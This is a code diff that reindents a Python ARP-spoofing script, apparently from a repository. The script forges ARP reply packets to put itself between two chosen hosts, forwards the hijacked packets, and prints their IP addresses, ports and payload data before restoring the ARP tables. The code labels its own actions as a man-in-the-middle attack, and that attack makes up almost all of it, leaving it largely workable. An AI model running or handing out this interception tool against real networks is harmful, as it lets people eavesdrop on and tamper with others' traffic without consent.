@@ -10,9 +10,9 @@ import re
 
 # ARPs for the mac address of an IP
 def get_mac(ip):
-	mac = str(subprocess.check_output(['arping', '-f', ip]))
-	mac = re.search('([0-9A-F]{2}[:]){5}([0-9A-F]{2})', mac).group(0)
-	return pack('!6B', *[int(x, 16) for x in mac.split(':')])
+    mac = str(subprocess.check_output(['arping', '-f', ip]))
+    mac = re.search('([0-9A-F]{2}[:]){5}([0-9A-F]{2})', mac).group(0)
+    return pack('!6B', *[int(x, 16) for x in mac.split(':')])
 
 # Prompts for host IP's
 ip1 = pack('!4B', *[int(x) for x in input("Host1's IP: ").split('.')])
@@ -33,24 +33,24 @@ my_mac = s.getsockname()[4]
 
 # Creates an arp packet
 def make_arp(target_ip, target_mac, sender_ip, sender_mac):
-	arp_packet = [
-		# Ethernet Header
-		target_mac,  # Destination mac address
-		my_mac,  # sender_mac,#Source mac address
-		pack('>H', 0x0806),  # Protocol type (ARP = 0x0806)
+    arp_packet = [
+        # Ethernet Header
+        target_mac,  # Destination mac address
+        my_mac,  # sender_mac,#Source mac address
+        pack('>H', 0x0806),  # Protocol type (ARP = 0x0806)
 
-		# ARP Header
-		pack('>H', 0x0001),  # Hardware type (Ethernet(10 Mb) = 1)
-		pack('>H', 0x0800),  # Protocol type (IP = 0x0800)
-		pack('>B', 0x06),  # Mac address length
-		pack('>B', 0x04),  # Ip address length
-		pack('>H', 0x0002),  # Opcode (ARP reply = 2)
-		sender_mac,  # Sender mac address
-		sender_ip,  # Sender ip address
-		target_mac,  # Target mac address
-		target_ip  # Target ip address
-	]
-	return b''.join(arp_packet)
+        # ARP Header
+        pack('>H', 0x0001),  # Hardware type (Ethernet(10 Mb) = 1)
+        pack('>H', 0x0800),  # Protocol type (IP = 0x0800)
+        pack('>B', 0x06),  # Mac address length
+        pack('>B', 0x04),  # Ip address length
+        pack('>H', 0x0002),  # Opcode (ARP reply = 2)
+        sender_mac,  # Sender mac address
+        sender_ip,  # Sender ip address
+        target_mac,  # Target mac address
+        target_ip  # Target ip address
+    ]
+    return b''.join(arp_packet)
 
 # Creates the two malicious ARP packets
 arp1 = make_arp(ip1, mac1, ip2, my_mac)
@@ -58,15 +58,15 @@ arp2 = make_arp(ip2, mac2, ip1, my_mac)
 
 # Starts the man in the middle attack
 def poison_arp():
-	s.send(arp1)
-	s.send(arp2)
+    s.send(arp1)
+    s.send(arp2)
 
 # Ends the man in the middle attack quietly
 def restore_connection():
-	arp1 = make_arp(ip1, mac1, ip2, mac2)
-	arp2 = make_arp(ip2, mac2, ip1, mac1)
-	s.send(arp1)
-	s.send(arp2)
+    arp1 = make_arp(ip1, mac1, ip2, mac2)
+    arp2 = make_arp(ip2, mac2, ip1, mac1)
+    s.send(arp1)
+    s.send(arp2)
 
 # Boolean to determine when to stop attacking
 attacking = True
@@ -82,9 +82,9 @@ def listen_to_incoming_packets(Host_One_IP, Host_Two_IP, Host_One_MAC, Host_Two_
         ethernet_length = 14
         eth_header = packet[:ethernet_length] #Ethernet header is 14 bytes
         unpacked_eth = unpack('>6s6sH', eth_header)
-		#  unpacked_eth:
-		#-----------------
-		#  index:
+        #  unpacked_eth:
+        #-----------------
+        #  index:
         #   0 -  Destination MAC Address (48 bits)
         #   1 - Source MAC Address (48 bits)
         #   2 - EtherType (16 bits)
@@ -109,13 +109,13 @@ def listen_to_incoming_packets(Host_One_IP, Host_Two_IP, Host_One_MAC, Host_Two_
         srcIP = socket.inet_ntoa(unpacked_iph[8])
         dstIP = socket.inet_ntoa(unpacked_iph[9])
 
-		#Forward packet to victim
+        #Forward packet to victim
         new_dst_MAC = None
         if dstIP == Host_One_IP:
             new_dst_MAC = Host_One_MAC
         elif dstIP == Host_Two_IP:
             new_dst_MAC = Host_Two_MAC
-		#Reconstruct packet with actual MAC
+        #Reconstruct packet with actual MAC
         if new_dst_MAC != None:
             new_packet = [new_dst_MAC,packet[6:]]
             s.send(b''.join(new_packet))
@@ -143,24 +143,24 @@ def listen_to_incoming_packets(Host_One_IP, Host_Two_IP, Host_One_MAC, Host_Two_
         header_size = ethAndIP_len + tcp_header_length
 
         data = packet[header_size:]
-		data = unpack('>' + str(len(data)) + 's',data)
+        data = unpack('>' + str(len(data)) + 's',data)
 
         if srcIP == Host_One_IP or srcIP == Host_Two_IP or dstIP == Host_One_IP or dstIP == Host_Two_IP:
             print('SrcIP: ' + str(srcIP) + ' SrcPort: ' + str(srcPort) + ' DestIP: ' + str(dstIP) + ' DestPort: ' + str(dstPort) + '\nData: ' + str(data))
 
 # Starts the packet sniffer thread
 def start_sniffer():
-	Thread(target=listen_to_incoming_packets, args=(ip1, ip2, mac1, mac2)).start()
+    Thread(target=listen_to_incoming_packets, args=(ip1, ip2, mac1, mac2)).start()
 
 # Used to end the attack
 def poll_console(self):
-	input("Type q to quit...")
-	self.attacking = False
+    input("Type q to quit...")
+    self.attacking = False
 
 # Starts the man in the middle attack
 Thread(target=poll_console).start()
 start_sniffer()
 while attacking:
-	poison_arp()
-	sleep(500)
+    poison_arp()
+    sleep(500)
 restore_connection()
